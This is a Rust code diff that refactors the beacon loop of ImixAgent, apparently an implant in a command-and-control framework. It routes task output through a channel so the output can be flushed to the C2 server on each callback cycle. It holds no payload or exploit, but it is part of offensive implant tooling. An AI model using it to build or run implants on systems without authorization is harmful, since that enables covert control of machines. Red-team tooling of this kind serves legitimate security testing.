@@ -6,7 +6,9 @@ use std::time::{Duration, Instant};
 use crate::agent::ImixAgent;
 use crate::task::TaskRegistry;
 use crate::version::VERSION;
+use pb::c2;
 use pb::config::Config;
+use tokio::sync::mpsc;
 use transport::{ActiveTransport, Transport};
 
 pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
@@ -26,12 +28,13 @@ pub async fn run_agent() -> Result<()> {
 
     let handle = tokio::runtime::Handle::current();
     let task_registry = Arc::new(TaskRegistry::new());
-    let agent = Arc::new(ImixAgent::new(
+    let (agent_struct, mut output_rx) = ImixAgent::new(
         config,
         transport,
         handle,
         task_registry.clone(),
-    ));
+    );
+    let agent = Arc::new(agent_struct);
 
     // Track the last interval we slept for, as a fallback in case we fail to read the config
     let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);
@@ -44,7 +47,7 @@ pub async fn run_agent() -> Result<()> {
         let agent_ref = agent.clone();
         let registry_ref = task_registry.clone();
 
-        run_agent_cycle(agent_ref, registry_ref).await;
+        run_agent_cycle(agent_ref, registry_ref, &mut output_rx).await;
 
         if SHUTDOWN.load(Ordering::Relaxed) || run_once {
             break;
@@ -83,7 +86,11 @@ pub fn init_logger() {
     }
 }
 
-async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
+async fn run_agent_cycle(
+    agent: Arc<ImixAgent<ActiveTransport>>,
+    registry: Arc<TaskRegistry>,
+    rx: &mut mpsc::UnboundedReceiver<c2::ReportTaskOutputRequest>,
+) {
     // Refresh IP
     agent.refresh_ip().await;
 
@@ -107,7 +114,7 @@ async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<T
     process_tasks(&agent, &registry).await;
 
     // Flush Outputs (send all buffered output)
-    agent.flush_outputs().await;
+    agent.flush_outputs(rx).await;
 
     // Disconnect (drop transport)
     agent.update_transport(ActiveTransport::init()).await;
